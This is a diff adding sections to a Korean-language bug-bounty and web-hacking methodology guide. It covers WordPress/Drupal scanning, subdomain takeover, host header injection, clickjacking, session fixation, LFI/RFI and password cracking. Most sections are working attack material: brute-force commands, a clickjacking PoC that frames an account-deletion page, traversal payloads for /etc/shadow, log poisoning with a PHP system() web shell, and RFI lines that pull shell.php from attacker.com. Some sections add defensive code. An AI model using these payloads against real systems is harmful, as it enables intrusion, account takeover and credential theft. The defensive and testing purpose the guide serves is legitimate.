@@ -407,3 +407,427 @@ trufflehog git https://github.com/target-org/target-repo
 SSRF (Medium) + AWS 메타데이터 접근 (High) + IAM 자격증명 탈취 (Critical)
 정보 노출 (Low) + 계정 탈취로 연결 (High)
 ```
+
+---
+
+## 8-2. CMS 해킹 방법론 (Bug Bounty 관점)
+
+### WordPress 취약점 탐지
+```bash
+# WPScan — WordPress 전용 취약점 스캐너
+wpscan --url https://target.com
+wpscan --url https://target.com --enumerate p  # 플러그인 열거
+wpscan --url https://target.com --enumerate u  # 사용자 열거
+wpscan --url https://target.com -P wordlist.txt --username admin  # 패스워드 브루트포스
+
+# 플러그인 버전 확인 → ExploitDB 검색
+wpscan --url https://target.com --enumerate p --plugins-detection aggressive
+
+# XML-RPC 취약점 확인
+curl -X POST https://target.com/xmlrpc.php \
+  -d '<methodCall><methodName>system.listMethods</methodName></methodCall>'
+# XML-RPC 활성화 시 → 브루트포스, SSRF 등에 활용 가능
+```
+
+### Drupal / Joomla 취약점 탐지
+```bash
+# Droopescan — Drupal 스캐너
+droopescan scan drupal -u https://target.com
+
+# Joomscan — Joomla 스캐너
+joomscan -u https://target.com
+
+# 공통 CMS 취약점 탐색 (Nuclei)
+nuclei -u https://target.com -tags cms,wordpress,drupal,joomla
+```
+
+### 알려진 취약점(1-day) 활용 방법론
+```
+1. 기술 스택 식별
+   → Wappalyzer, WhatWeb, HTTP 응답 헤더 분석
+
+2. 버전 특정
+   → /readme.txt, /CHANGELOG.txt, /admin/modules 경로 확인
+   → HTTP 응답의 X-Powered-By, Generator 메타태그
+
+3. 취약점 검색
+   → searchsploit "[CMS명] [버전]"
+   → https://nvd.nist.gov/vuln/search
+   → https://www.exploit-db.com/
+   → GitHub: site:github.com "CVE-20XX-XXXXX"
+
+4. POC 확보 및 테스트
+   → GitHub에서 POC 코드 검색 (신뢰할 수 없는 POC 주의!)
+   → 로컬 테스트 환경에서 먼저 검증
+
+5. 1-day 추적 전략
+   → ExploitDB RSS, Twitter 위협 피드 모니터링
+   → 새 CVE 발표 후 빠르게 타겟 스캔 (패치 전 타임윈도우)
+```
+
+---
+
+## 8-3. GitHub / 서브도메인 탈취 (Subdomain Takeover)
+
+```bash
+# 서브도메인 탈취 취약점 탐지
+# CNAME이 외부 서비스를 가리키지만 해당 서비스에 등록 안 된 경우
+
+# 취약한 패턴 확인
+dig sub.target.com CNAME
+# → CNAME: some-name.github.io (GitHub Pages, 미등록)
+# → CNAME: bucket.s3.amazonaws.com (S3, 미생성)
+# → CNAME: target.herokuapp.com (Heroku, 미등록)
+
+# 자동 탐지 도구
+subjack -w subdomains.txt -t 100 -o takeover_results.txt
+subzy run --targets subdomains.txt
+
+# GitHub Pages 탈취 (CNAME 미등록 시)
+# 1. GitHub 계정 생성
+# 2. 동일한 이름의 저장소 생성
+# 3. GitHub Pages 활성화
+# 4. 타겟 서브도메인이 공격자 페이지를 가리킴
+
+# S3 버킷 탈취
+# 1. 버킷 이름과 동일한 S3 버킷 생성 (같은 리전)
+# 2. 피싱 페이지 업로드
+```
+
+---
+
+## 9. Host Header Injection
+
+### 공격 원리
+```
+HTTP Host 헤더를 서버가 그대로 신뢰하여 처리할 때 발생
+→ 비밀번호 재설정 링크, 캐시 포이즈닝, SSRF 등에 악용 가능
+```
+
+### Host Header Injection 기법
+```http
+# 1. 비밀번호 재설정 링크 변조
+POST /reset-password HTTP/1.1
+Host: attacker.com         ← 변조
+
+이메일로 발송되는 링크:
+https://attacker.com/reset?token=abc123  ← 공격자 도메인 포함
+
+# 2. X-Forwarded-Host 사용
+POST /reset-password HTTP/1.1
+Host: target.com
+X-Forwarded-Host: attacker.com   ← 프록시 헤더 악용
+
+# 3. 포트 번호 주입
+Host: target.com:@attacker.com
+
+# 4. 서브도메인 추가
+Host: attacker.com.target.com
+
+# 5. 중복 Host 헤더
+Host: target.com
+Host: attacker.com   ← 두 번째 Host가 우선 처리될 수 있음
+```
+
+### 캐시 포이즈닝 (Host Header → Web Cache Poisoning)
+```bash
+# CDN/리버스 프록시가 Host 헤더를 응답에 반영하면서 캐시할 때
+GET / HTTP/1.1
+Host: target.com
+X-Forwarded-Host: evil.com"><script>alert(1)</script>
+
+# 응답이 캐시되면 → 다른 사용자도 XSS 영향을 받음
+```
+
+### Host Header Injection 방어
+```python
+# Flask: 허용된 호스트 화이트리스트
+ALLOWED_HOSTS = ['target.com', 'www.target.com']
+
+@app.before_request
+def check_host():
+    if request.host not in ALLOWED_HOSTS:
+        abort(400)
+
+# Django: ALLOWED_HOSTS 설정
+ALLOWED_HOSTS = ['target.com', 'www.target.com']
+
+# 비밀번호 재설정 URL을 환경변수로 하드코딩
+RESET_BASE_URL = 'https://target.com/reset'
+```
+
+---
+
+## 10. Clickjacking
+
+### 공격 원리
+```
+피해자 사이트를 투명한 iframe으로 겹쳐 놓고
+사용자가 자신도 모르게 클릭하도록 유도
+
+공격 흐름:
+1. 공격자 → 악성 페이지 제작
+2. 페이지에 target.com을 투명 iframe으로 삽입
+3. 피해자를 악성 페이지로 유인
+4. 피해자가 버튼을 누르면 실제로 target.com의 동작 수행
+   (송금, 설정 변경, 계정 삭제 등)
+```
+
+### Clickjacking PoC
+```html
+<!DOCTYPE html>
+<html>
+<head>
+  <style>
+    #target-frame {
+      opacity: 0.0;       /* 완전 투명 (실제 공격) */
+      /* opacity: 0.5;    시연용 반투명 */
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 2;
+    }
+    #decoy-content {
+      position: absolute;
+      top: 100px;
+      left: 200px;
+      z-index: 1;
+      font-size: 24px;
+    }
+  </style>
+</head>
+<body>
+  <!-- 피해자에게 보이는 가짜 버튼 -->
+  <div id="decoy-content">
+    <h2>무료 경품 받기!</h2>
+    <button style="padding:20px;font-size:20px">클릭하세요!</button>
+  </div>
+  
+  <!-- 투명하게 겹친 실제 타겟 사이트 -->
+  <iframe id="target-frame"
+          src="https://target.com/account/delete"
+          scrolling="no">
+  </iframe>
+</body>
+</html>
+```
+
+### Clickjacking 탐지
+```bash
+# X-Frame-Options 헤더 확인
+curl -I https://target.com | grep -i "x-frame\|frame-ancestors"
+
+# 취약한 응답: 헤더 없음 또는
+X-Frame-Options: ALLOWALL
+
+# 안전한 응답
+X-Frame-Options: DENY
+X-Frame-Options: SAMEORIGIN
+Content-Security-Policy: frame-ancestors 'none'
+```
+
+### Clickjacking 방어
+```http
+# 서버 응답 헤더 추가
+X-Frame-Options: DENY          # 모든 사이트에서 iframe 금지
+X-Frame-Options: SAMEORIGIN    # 동일 도메인만 iframe 허용
+
+# 더 유연한 CSP 방식 (권장)
+Content-Security-Policy: frame-ancestors 'none';
+Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
+```
+
+```javascript
+// Frame busting (구식, 권장하지 않음)
+if (window.top !== window.self) {
+    window.top.location = window.self.location;
+}
+```
+
+---
+
+## 11. Session Fixation (세션 고정)
+
+### 공격 원리
+```
+1. 공격자 → 자신의 세션 ID 확보
+2. 공격자 → 피해자에게 해당 세션 ID를 사용하도록 강제
+3. 피해자 → 해당 세션 ID로 로그인
+4. 공격자 → 같은 세션 ID로 피해자 계정에 접근
+```
+
+### Session Fixation 시나리오
+```
+취약한 플로우:
+1. 미인증 사용자에게 세션 발급: PHPSESSID=ATTACKER_KNOWN_ID
+2. URL 파라미터로 세션 전달:
+   http://target.com/login?PHPSESSID=fixed_session_id
+3. 피해자가 해당 URL로 로그인 완료
+4. 서버가 로그인 후 세션 ID를 재발급하지 않음
+5. 공격자가 ATTACKER_KNOWN_ID로 피해자 계정 접근
+```
+
+### 탐지 방법
+```bash
+# 1. 로그인 전후 세션 ID 비교
+# Before login:
+Set-Cookie: session=BEFORE_LOGIN_ID
+
+# After login:
+Set-Cookie: session=BEFORE_LOGIN_ID  ← 세션 ID가 동일 → 취약!
+# 안전: Set-Cookie: session=AFTER_LOGIN_NEW_ID ← 다른 ID 발급
+
+# 2. URL 파라미터로 세션 수락 여부 테스트
+GET /login?PHPSESSID=test123 HTTP/1.1
+# 로그인 후 test123이 유지되면 → Session Fixation 취약
+```
+
+### Session Fixation 방어
+```php
+// PHP: 로그인 성공 후 반드시 세션 재생성
+session_start();
+// ... 로그인 검증 ...
+if (login_successful) {
+    session_regenerate_id(true);  // 새 세션 ID 발급, 이전 세션 삭제
+    $_SESSION['user'] = $user_id;
+}
+```
+
+---
+
+## 12. LFI / RFI (파일 인클루전 취약점)
+
+### LFI (Local File Inclusion)
+```bash
+# 기본 LFI
+http://target.com/?page=../../../etc/passwd
+http://target.com/?file=../../../../etc/shadow
+
+# 인코딩 우회
+http://target.com/?page=..%2F..%2F..%2Fetc%2Fpasswd
+http://target.com/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd
+http://target.com/?page=....//....//etc/passwd   (중복 슬래시 필터 우회)
+
+# Null byte 우회 (PHP 5.3 이하)
+http://target.com/?page=../../../etc/passwd%00
+http://target.com/?page=../../../etc/passwd%00.jpg
+
+# 경로 잘라내기 (Path Truncation — PHP 특유)
+http://target.com/?page=../../../etc/passwd.......................
+
+# 타겟 파일 목록
+/etc/passwd          (사용자 계정 정보)
+/etc/hosts           (호스트 파일)
+/etc/ssh/sshd_config (SSH 설정)
+/proc/self/environ   (환경 변수 — PHP 코드 삽입 가능)
+/var/log/apache2/access.log   (로그 포이즈닝 대상)
+/var/log/nginx/access.log
+/proc/self/fd/2      (stderr)
+/var/mail/www-data
+```
+
+### LFI → RCE (Log Poisoning)
+```bash
+# 1단계: 로그 파일에 PHP 코드 삽입
+curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/
+
+# 2단계: LFI로 로그 파일 실행
+http://target.com/?page=../../../../var/log/apache2/access.log&cmd=id
+
+# PHP Session 파일 인젝션
+# PHP 세션 파일 위치: /tmp/sess_[SESSION_ID]
+# 세션에 PHP 코드 저장 후 LFI로 실행
+```
+
+### RFI (Remote File Inclusion)
+```bash
+# 기본 RFI (allow_url_include=On 설정 시)
+http://target.com/?page=http://attacker.com/shell.php
+http://target.com/?page=ftp://attacker.com/shell.php
+
+# attacker.com/shell.php 내용
+<?php system($_GET['cmd']); ?>
+
+# SMB를 통한 RFI (Windows)
+http://target.com/?page=\\attacker.com\share\shell.php
+
+# Data URI를 이용한 LFI/RFI 우회
+http://target.com/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+```
+
+### LFI/RFI 방어
+```php
+// PHP: 화이트리스트 방식
+$allowed_pages = ['home', 'about', 'contact'];
+$page = $_GET['page'];
+
+if (!in_array($page, $allowed_pages)) {
+    die('Invalid page');
+}
+
+include('pages/' . $page . '.php');
+
+// realpath()로 경로 탐색 방지
+$base = realpath('/var/www/html/pages/');
+$file = realpath($base . '/' . $page . '.php');
+
+if (strpos($file, $base) !== 0) {
+    die('Path traversal detected!');
+}
+
+// PHP 설정
+// allow_url_include = Off  (RFI 차단)
+// allow_url_fopen = Off    (원격 파일 차단)
+```
+
+---
+
+## 13. 패스워드 크래킹 기법
+
+### 오프라인 크래킹 도구
+```bash
+# Hashcat — GPU 기반 고속 크래킹
+# MD5 크래킹
+hashcat -a 0 -m 0 hashes.txt wordlist.txt
+
+# SHA-256
+hashcat -a 0 -m 1400 hashes.txt wordlist.txt
+
+# bcrypt ($2a$)
+hashcat -a 0 -m 3200 hashes.txt wordlist.txt
+
+# NTLM (Windows 해시)
+hashcat -a 0 -m 1000 ntlm_hashes.txt wordlist.txt
+
+# 규칙 기반 (변형 적용)
+hashcat -a 0 -m 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+
+# 브루트포스 (마스크 어택)
+hashcat -a 3 -m 0 hashes.txt ?a?a?a?a?a?a?a?a  (8자 모든 문자)
+hashcat -a 3 -m 0 hashes.txt ?d?d?d?d?d?d       (6자리 숫자)
+
+# John the Ripper
+john --wordlist=wordlist.txt hashes.txt
+john --format=md5 hashes.txt --wordlist=rockyou.txt
+john --rules --wordlist=wordlist.txt hashes.txt  # 규칙 적용
+```
+
+### 해시 식별
+```bash
+# hashid로 해시 유형 식별
+hashid 5f4dcc3b5aa765d61d8327deb882cf99
+# → MD5, Domain Cached Credentials
+
+# hash-identifier
+python3 hash-identifier.py
+
+# 주요 해시 형식
+$1$   → MD5 (Linux)
+$2a$  → bcrypt
+$5$   → SHA-256 (Linux)
+$6$   → SHA-512 (Linux)
+$y$   → yescrypt
+NTLM  → aad3b435b51404eeaad3b435b51404ee:hash (Windows)
+```
